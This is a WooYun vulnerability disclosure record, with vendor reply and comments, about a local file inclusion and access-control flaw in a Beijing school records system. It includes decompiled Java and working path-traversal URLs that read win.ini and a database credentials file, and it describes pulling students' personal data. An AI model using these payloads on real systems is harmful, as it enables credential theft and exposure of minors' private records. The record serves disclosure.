{"id": 47284, "wybug_id": "wooyun-2014-081581", "wybug_title": "某市通用学籍管理系统越权+本地文件包含造成几百万学生详细数据泄露", "wybug_corp": "becom.com.cn", "wybug_author": "Haswell", "wybug_date": "2014-11-01 12:00", "wybug_open_date": "2015-01-30 12:02", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["任意文件读取利用", "任意文件读取", "源码审计", "影响很大"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-09：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-30：\t细节向公众公开  简要描述： 自 2001 年开始，校园管理信息系统（简称CMIS）已在全市近 1800 所中小学安装应用。北京市教委也下发了京教基 [2001]6 号文件，将CMIS应用作为高质量完成“校校通”工程的标准之一。 截至至目前，北京市全部中小学在校内均部署cmis系统，而且业务面极广，内含大量敏感数据，包括学生家长，应届毕业生在内的详细到电话住址的记录，所以cmis也成为针对学生的诈骗，营销的黑色产业链的主要数据来源。同样，由于和多套其它系统同时部署，也会互相殃及。这一处本地文件包含可以无限制地读取系统日志，系统配置文件，结合技巧可以直接下载敏感数据。另：这是第一弹 详细说明：  首先是信息收集环节因为北京每个学校都部署了相同系统所以很顺利地找到了官网：card.bjedu.com\n\n发现提供了这套系统安装包的下载\n\n将其下载\n\n结构一目了然！然后问题出在了\nhttp://host/cmis40/photo/PictureFOS.a?pid=\n的pid参数 首先，这是一处越权，可以随意查看遍历学生照片。如\n\n其次由于过滤不严造成了本地文件包含：）我们来看看代码（审计开始）\n\n首先反编译问题class文件\\ediasoft\\webapps\\cmis40\\WEB-INF\\classes\\com\\becom\\cmis40\\webapp\\action\\PictureFOS.class观察到pid参数是直接request.getParameter()传入,\n........public Object performTask(HttpServletRequest request, HttpServletResponse response)  {    ........    String pid = request.getParameter(\"pid\");    ........    String pictureFile = null;    try    {     ...........      String picturePath = this.initDictionUtil.getParamValueByParamId(\"2\");      if ((picturePath == null) || (picturePath.trim().length() == 0)) {        SystemMessage.addErrorMessage(op + \"照片显示，系统没有设置照片存放路径参数！\");        return null;      }      File file = new File(picturePath + File.separator + \"localschool\" + File.separator + pictureFile);\n观察picturePath,直接使用this.initDictionUtil.getParamValueByParamId取得跟进至initDictionUtil.class\npublic String getParamValueByParamId(String paramId)  {    return (String)this.sysParamsMap.get(paramId);  }\n继续\npublic Map<String, String> sysParamsMap = new ConcurrentHashMap();\n一个ConcurrentHashMap对象(Java5 里的新hashmap实现)，也就是说关键之处在于sysParamsMap.put(xx,xx)的调用\npublic void cacheSysParam()  {    List sysParams = this.BSetparameterManager.findAll();    if ((sysParams == null) || (sysParams.size() <= 0))      return;    for (BSetparameter oneParam : sysParams)    {      if (!StringUtil.isNotEmpty(oneParam.getContent()))        continue;      this.sysParamsMap.put(oneParam.getParameterid().toString(), oneParam.getContent());    }  }\n此刻都明了了，一个所有参数的cache，也不必继续跟进了findAll()从缓存表里取出所有参数id以及参数值然后sysParamsMap.put(id,内容)再回到开始String picturePath = this.initDictionUtil.getParamValueByParamId(\"2\");恰好取出了第一个参数也就是pid的值这个值是我们可控的，观察一下全局的过滤，发现使用..%2f就可以绕过\"/\"进行目录跳转接下来new File(picturePath + File.separator + \"localschool\" + File.separator + pictureFile);文件路径拼接，%00直接截断就成功了：）   漏洞证明：  现在来让我们搞一下win.ini来验证http://host/cmis40/photo/PictureFOS.a?pid=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows%2fwin.ini%00\n\n哇咔咔接下来是利用环节~~首先当然是数据库连接密码db-conf.properties/cmis40/photo/PictureFOS.a?pid=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fediasoft%2fwebapps%2fcmis40%2fWEB-INF%2fclasses%2fdb-conf.properties%00.a实例简直了遍地都是，部分配置错误，允许了数据库外联\n\n当然了这个漏洞的一大价值在于1.有心人能下载到整套系统源码，意味着核心敏感配置均可被读取(比如这些)\n\n2.这个业务出在cmis，却涉及不同系统，包括这些（ediasoft/webapps）\n\n*普通高中课程管理 *高中生档案管理 *高中学生综合素质评价 但是到了这里，还没完，还可以结合一些技巧直接获得一些关键信息数据通过直接包含学生信息导出的备份文件可以获取学段\t年级\t班级\tp_id\t姓名\t性别\t证件号\t学生学籍号\t姓名拼音\t曾用名\t学生类别\t证件类型\t出生日期\t出生地\t民族\t籍贯\t宗教信仰\t港澳台侨\t健康状况\t现住址所属区县\t现住址\t户口性质\t就读方式\t国别\t特长\t联系电话\t通信地址\t入学成绩（总分）\t校内编号\t建立学籍依据\t有关材料证明\t本记录建立日期\t中考考号\t高考考号\t毕业考号\t备注\t学生状态\t政治面貌\t原学校名称\t入学年月\t入学方式\t来源地区\t升学准考证号\t学生来处（地区）\t学生来源\t姓名\t关系\t工作单位\t联系电话\t姓名\t关系\t工作单位\t联系电话\t监护人姓名\t监护人关系\t监护人工作单位\t监护人联系电话\t监护人职务支持一下新功能，我放测试代码里了如图\n\n   修复方案：  你比我懂，为祖国花朵提供服务更应注重安全，首先安装包只应内部发放，细节决定边界安全。   版权声明：转载请注明来源 Haswell@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2014-11-06 09:18 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-01-30 13:49 |    \t\t风过情殇 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 每个黑客心底都有着不屈的灵魂)\t\t \n  思路清晰！结果了然于胸！佩服    \n     2015-01-30 14:56 |    \t\t刘海哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:114 漏洞数:28        | 索要联系方式但不送礼物的厂商定义为无良厂...)\t\t \n  测试代码：新模式哇    \n     2015-02-03 14:03 |    \t\tlaoyao \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:5        | ด้้้้้็็็็็้้้้้็็็็...)\t\t \n  mark    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}